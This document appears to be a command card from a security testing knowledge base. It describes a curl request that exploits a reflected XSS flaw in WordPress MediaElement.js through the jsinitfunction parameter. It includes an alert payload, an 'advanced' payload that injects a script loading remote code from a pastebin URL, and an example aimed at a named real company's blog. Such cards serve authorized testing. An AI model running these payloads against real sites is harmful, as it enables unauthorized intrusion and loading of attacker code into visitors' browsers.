---
data: >-
  curl -X GET
  "https://target.com/wp-includes/js/mediaelement/flashmediaelement.swf?jsinitfunction=alert%601%60"
  -v
tags:
  - xss
  - testing
  - web
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:16:14.101Z'
id: 087b9bd2-de3c-4602-ad48-09f22da91f18
verified: false
validated: true
submitted: true
---
# curl-xss-poc-test

## Command

```bash
curl -X GET "https://target.com/wp-includes/js/mediaelement/flashmediaelement.swf?jsinitfunction=alert%601%60" -v
```

## Description

This command uses curl to send a GET request to the vulnerable MediaElement.js endpoint with a reflected XSS payload in the jsinitfunction parameter, testing for parameter reflection. It's useful for initial verification before browser testing, though full execution requires a browser context.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies the HTTP method | Yes |
| URL | Target endpoint with payload | Yes |
| `-v` | Verbose output to see response headers and body | No |

## Examples

### Basic Usage

```bash
curl "https://business-blog.zomato.com/wp-includes/js/mediaelement/flashmediaelement.swf?jsinitfunction=alert%601%60"
```

### Advanced Usage

```bash
curl -X GET "https://target.com/wp-includes/js/mediaelement/flashmediaelement.swf?jsinitfunction=var%20s%3Ddocument.createElement(%27script%27)%3Bs.src%3D%27https%3A%2F%2Fpastebin.com%2Fraw%2Fabc%27%3Bdocument.head.appendChild(s)%3B" -v -o response.html
```

## Expected Output

HTTP response showing the reflected parameter in the body or headers, e.g., the SWF file content with jsinitfunction echoed back. In verbose mode (-v), details on request/response cycle. No alert in curl, but confirms reachability.

## Related

- [[Related Procedure: Exploit-Reflected-XSS-in-MediaElement.js]]
